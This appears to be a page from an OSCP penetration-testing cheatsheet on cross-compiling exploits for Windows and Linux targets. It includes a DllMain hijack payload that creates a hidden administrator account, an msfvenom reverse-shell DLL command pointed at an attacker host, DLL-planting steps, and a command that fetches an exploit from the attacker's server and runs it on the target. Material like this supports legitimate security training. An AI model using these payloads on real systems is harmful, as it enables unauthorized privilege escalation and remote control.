---
title: "Cross-Compiling"
date: 2026-06-20
weight: 160
draft: false
summary: "What to do for Windows and Linux when the target cannot compile, or when you should test on Kali first."
---

What to do when the target cannot compile, when you should test on Kali first, and when GLIBC gets in the way. Covers both Windows (mingw + wine) and Linux (docker + static).

- Source: https://heretek.dev/oscp-cheatsheet/cross-compiling/ (Jean Romero) — Reconstructed
- Variables: `$TARGET` = target host, `$KALI` = attacker Kali IP

## 1. When to use this document

- The public exploit is .c but the target is Windows and you need an EXE → §3
- The public exploit is .c but the target is Linux and has no gcc → §5
- The compiled binary works on Kali but fails on the target → §6 + §7
- GLIBC_X.Y not found on the target → §5 (version-matched container)
- Launch the remote exploit directly from Kali instead of uploading → §6 (wine)

## 2. Setup (once on Kali)

```bash
# Windows cross-compile
sudo apt install mingw-w64

# Run Windows binaries on Kali
sudo dpkg --add-architecture i386 && sudo apt update
sudo apt install wine wine32 wine64

# Linux precompile in matching distro
sudo apt install docker.io && sudo systemctl start docker
```

Two kinds of mingw compilers — the architecture must match the target (important):

- `i686-w64-mingw32-gcc` — 32-bit Windows PE
- `x86_64-w64-mingw32-gcc` — 64-bit Windows PE (the usual default today)

Check with `file evil.exe` — `PE32` = 32-bit, `PE32+` = 64-bit. A mismatch fails silently.

## 3. Building a Windows EXE from C source

```bash
# Basic
x86_64-w64-mingw32-gcc adduser.c -o adduser.exe

# Network exploit (winsock)
i686-w64-mingw32-gcc exploit.c -o exploit.exe -lws2_32

# Static — no DLL deps on target
x86_64-w64-mingw32-gcc -static -o exploit.exe exploit.c -lws2_32
```

Linker error rule: `undefined reference to _imp__<symbol>` → look up the symbol → add the matching `-l` flag.

Flags per symbol:

- `WSAStartup`, `socket`, `connect`, `send` → `-lws2_32` (winsock)
- `InternetOpen`, `HttpSend` → `-lwininet` (HTTP)
- `RegOpenKey`, `OpenSCManager` → `-ladvapi32` (registry / services)

## 4. Windows DLL for DLL hijacking

Use the same compiler with `--shared` and the `.dll` extension. The filename must exactly match the DLL the target app loads (required).

```bash
x86_64-w64-mingw32-gcc evil.cpp --shared -o TextShaping.dll
```

DllMain template — the payload runs on `DLL_PROCESS_ATTACH`:

```text
#include <stdlib.h>
#include <windows.h>

BOOL APIENTRY DllMain(HANDLE hModule, DWORD ul_reason_for_call, LPVOID lpReserved) {
    switch (ul_reason_for_call) {
        case DLL_PROCESS_ATTACH:
            int i;
            i = system("net user pwned Password123! /add");
            i = system("net localgroup administrators pwned /add");
            break;
        case DLL_THREAD_ATTACH:  break;
        case DLL_THREAD_DETACH:  break;
        case DLL_PROCESS_DETACH: break;
    }
    return TRUE;
}
```

If you only need a reverse shell, msfvenom is faster:

```bash
msfvenom -p windows/x64/shell_reverse_tcp LHOST=ATTACKER LPORT=443 -f dll -o evil.dll
```

DLL hijacking procedure:

1. Check whether your account has `(M)` or `(F)` with `icacls "C:\App"`
2. Identify the target DLL name (procmon on a local copy, or a known CVE)
3. Drop your DLL into the writable directory with exactly the same name as the target DLL (exact filename required)
4. Wait for a privileged user to launch the app — the DLL loads with that user's privileges

## 5. Linux ELF — when the target has no gcc

The real problem is usually not "no gcc" but a glibc mismatch (important). Compiling on Kali (latest glibc) fails on an older target with `GLIBC_2.34 not found`.

### Strategy A — Static linking first (fast and often works)

```bash
gcc -static -o exploit exploit.c
file exploit         # should say "statically linked"
```

A static binary does not depend on the target glibc. The file is larger, but it runs anywhere the architecture matches.

When static linking does not work: exploits that depend on dynamic loader behavior (PwnKit cannot be compiled statically), and exploits that use dlopen/dlsym.

### Strategy B — Docker container matching the target distro

```bash
# Identify target first
cat /etc/os-release           # on target

# On Kali — spin up matching container
mkdir ~/xc && cd ~/xc
# put exploit.c in this dir

docker run -it --rm -v $(pwd):/work ubuntu:20.04 bash
# inside container:
apt update && apt install -y gcc make
cd /work && gcc -o exploit exploit.c
exit

# Back on Kali:
file exploit          # confirm: ELF 64-bit, x86_64
python3 -m http.server 8000

# On target:
wget http://KALI_IP:8000/exploit && chmod +x exploit && ./exploit
```

Target distro → container:

- Ubuntu 16.04 / 18.04 / 20.04 → `ubuntu:16.04` / `:18.04` / `:20.04`
- Debian 9 / 10 / 11 → `debian:9` / `:10` / `:11`
- CentOS 7 → `centos:7`
- RHEL/CentOS 8 → `rockylinux:8`
- Alpine → `alpine:3.X`

## 6. Testing before transfer

### Check the architecture — always

```bash
file evil.exe     # PE32 or PE32+ — must match target arch
file exploit      # ELF 32-bit or 64-bit — must match target arch
```

### Wine — smoke-test Windows binaries on Kali

```bash
wine evil.exe                 # smoke test
sudo wine exploit.exe         # if raw socket privileges needed
```

Two real uses:

1. Smoke test — if it crashes in wine, it is broken. Do not waste a target reset on a binary that will not work anyway.
2. Run remote network exploits directly from Kali — many compiled exploits open a socket and fire at the target IP. No need to upload to Windows.

What works in wine: network exploits, simple utilities, BoF stubs, basic system() calls.
What does not work in wine: SeImpersonate Potato attacks, anything needing real Windows services / .NET / WMI / SCM, GUI apps. Transfer those to the real target.

## 7. Troubleshooting

Symptom / cause / fix, in order:

- `undefined reference to _imp__WSAStartup` → missing winsock link → add `-lws2_32`
- Works on Kali (wine) but not on the target → missing runtime DLL on target → rebuild with `-static`
- GLIBC_2.XX not found on target → glibc mismatch → build in a matching docker container, or use `-static`
- DLL transferred but the app ignores it → architecture or filename mismatch → check the architecture with `file evil.dll`, confirm the exact target DLL name
- App crashes without loading the DLL → broken DllMain → check the `return TRUE;` at the end
- Service restart to trigger the hijack is not possible → `sc stop`/`sc start` unavailable → with SeShutdownPrivilege use `shutdown /r /t 0`, otherwise wait for automatic restart or a scheduled trigger
- `wine: cannot find L"..."` → missing 32-bit dependencies → `sudo apt install wine32`
- Compiled binary is 0 bytes / corrupt → compiler failed silently → rerun with `-v` to see the error
